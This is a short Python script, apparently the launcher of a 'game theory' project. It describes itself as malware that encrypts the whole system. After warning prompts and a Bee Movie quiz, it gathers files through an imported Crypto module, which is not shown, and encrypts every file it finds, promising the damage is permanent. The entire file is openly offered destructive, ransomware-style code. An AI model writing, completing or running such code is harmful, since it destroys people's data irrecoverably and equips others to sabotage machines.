from gametheory.crypto import Crypto
from termcolor import cprint
import time
import re
import os

KEY_SIZE = 32
IV_SIZE = 16


def main():
    input(
        "Hello. Welcome to game theory.\nTHIS IS A MALWARE THAT WILL ENCRYPT YOUR WHOLE SYSTEM. DO NOT USE IT ON YOUR PERSONAL MACHINE. DO YOU UNDERSTAND THIS? [press ENTER if you understand this]")
    input('YOU WILL LOSE EVERYTHING. PRESS [ENTER] IF YOU ARE OK WITH THIS')
    script = input(
        "I don't believe you. Input the seventh word of the bee movie script below and press [ENTER] if you understand this\nHint: \"According to all known laws of aviation, there is no way that a bee should be able to fly\"\nThe word is: ").lower()
    if script == "aviation":
        crypto = Crypto(KEY_SIZE, IV_SIZE)
        print("Okay... im getting the files now, then...")

        files = crypto.get_files()
        print(files)
        input(
            "Press enter to forever encrypt every single one of those [ENTER] ")
        print("whatever. you asked for this. let it rip")
        time.sleep(2)
        for f in files:
            try:
                if os.path.isfile(f):
                    print("Encrypting: {}".format(f))
                    crypto.encrypt_file(f)
            except Exception as e:
                print("Could NOT encrypt: {}".format(f))


if __name__ == "__main__":
    main()
